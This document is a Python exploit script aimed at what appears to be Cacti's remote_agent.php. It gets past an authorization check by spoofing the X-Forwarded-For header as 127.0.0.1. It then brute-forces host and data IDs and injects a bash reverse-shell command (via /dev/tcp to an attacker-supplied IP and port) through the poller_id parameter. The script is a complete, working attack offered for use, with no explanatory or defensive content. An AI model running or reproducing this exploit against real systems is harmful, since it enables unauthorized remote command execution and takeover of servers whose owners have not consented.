import requests, optparse, sys
import urllib

def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_target', help='The url target')
    parser.add_option('', '--LHOST', dest='lhost', help='Your ip')
    parser.add_option('', '--LPORT', dest='lport', help='The listening port')
    (options, arguments) = parser.parse_args()
    if not options.url_target:
        parser.error('[*] Pls indicate the target URL, example: -u http://10.10.10.10')
    if not options.lhost:
        parser.error('[*] Pls indicate your ip, example: --LHOST=10.10.10.10')
    if not options.lport:
        parser.error('[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443')
    return options

def checkVuln():
    r = requests.get(Vuln_url, headers=headers)
    return (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403)

def bruteForcing():
    for n in range(1,5):
        for n2 in range(1,10):
            id_vulnUrl = f"{Vuln_url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
            r = requests.get(id_vulnUrl, headers=headers)
            if r.text != "[]":
                RDname = r.json()[0]["rrd_name"]
                if RDname == "polling_time" or RDname == "uptime":
                    print("Bruteforce Success!!")
                    return True, n, n2
    return False, 1, 1

def Reverse_shell(payload, host_id, data_ids):
    PayloadEncoded = urllib.parse.quote(payload)
    InjectRequest = f"{Vuln_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
    r = requests.get(InjectRequest, headers=headers)


if __name__ == '__main__':
    options = get_arguments()
    Vuln_url = options.url_target + '/remote_agent.php'
    headers = {"X-Forwarded-For": "127.0.0.1"}
    print('Checking...')
    if checkVuln():
        print("The target is vulnerable. Exploiting...")
        print("Bruteforcing the host_id and local_data_ids")
        is_vuln, host_id, data_ids = bruteForcing()
        myip = options.lhost
        myport = options.lport
        payload = f"bash -c 'bash -i >& /dev/tcp/{myip}/{myport} 0>&1'"
        if is_vuln:
            Reverse_shell(payload, host_id, data_ids)
        else:
            print("The Bruteforce Failled...")

    else:
        print("The target is not vulnerable")
        sys.exit(1)

